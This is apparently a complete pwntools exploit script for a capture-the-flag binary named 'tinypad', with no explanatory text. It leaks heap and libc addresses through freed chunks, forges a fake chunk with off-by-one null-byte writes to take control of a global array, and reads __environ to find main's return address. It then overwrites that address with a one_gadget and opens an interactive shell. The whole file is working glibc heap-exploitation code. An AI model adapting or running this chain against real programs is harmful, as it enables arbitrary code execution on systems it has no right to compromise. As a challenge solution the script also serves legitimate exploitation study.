from pwn import *

p = process("./tinypad")
libc = ELF("./libc.so.6")
context.log_level = 'debug'


def add(size, content):
    p.recvuntil("(CMD)>>> ")
    p.sendline("A")
    p.recvuntil("(SIZE)>>> ")
    p.sendline(str(size))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(content)

def delete(index):

    p.recvuntil("(CMD)>>> ")
    p.sendline("D")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(index))

def edit(index, content, ok=True):
    p.recvuntil("(CMD)>>> ")
    p.sendline("E")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(index))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(content)
    p.recvuntil("(Y/n)>>> ")
    if ok:
        p.sendline("Y")
    else:
        p.sendline("n")

#stage one
add(0x80, "A"*0x80)
add(0x80, "B"*0x80)
add(0x80, "C"*0x80)
add(0x80, "D"*0x80)
delete(3)
delete(1)

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
heap = u64(p.recvline().rstrip().ljust(8, "\x00")) - 0x120
log.info("heap_base: %s" % hex(heap))
p.recvuntil(" #   INDEX: 3\n")
p.recvuntil(" # CONTENT: ")
main_arena = u64(p.recv(6).ljust(8, "\x00")) - 0x58
log.info("main_arena: %s" % hex(main_arena))

delete(2)
delete(4)

#stage two
add(0x18, "A"*0x18)
add(0x100, "B"*0xf8 + p64(0x11))
add(0x100, "C"*0xf8)
add(0x100, "D"*0xf8)


tinypad = 0x602040
offset = heap + 0x20 - 0x602040 - 0x20
fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2

edit(3, "D"*0x20 + fake_chunk)
zero_byte_number = 8 - len(p64(offset).strip("\x00"))
for i in range(zero_byte_number+1):
  data = "A"*0x10 + p64(offset).strip("\x00").rjust(8-i, 'f')
  edit(1, data)


delete(2)
edit(4, "D"*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2)

#gdb.attach(p)

#stage three
libc_base = main_arena + 0x58 - 0x3c4b78
log.info("libc_base: %s" % hex(libc_base)) 
one_gadget =  libc_base + 0x45216
environ_pointer = libc_base + libc.symbols['__environ']

add(0xf0, "A"*0xd0 + p64(0x18) + p64(environ_pointer) + 'a'*8 + p64(0x602148))

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
main_ret = u64(p.recvline().rstrip().ljust(8, "\x00")) - 0x8*30
log.info("environ_addr: %s" % hex(main_ret))
edit(2, p64(main_ret))
edit(1, p64(one_gadget))
#p.recvall()
p.interactive()
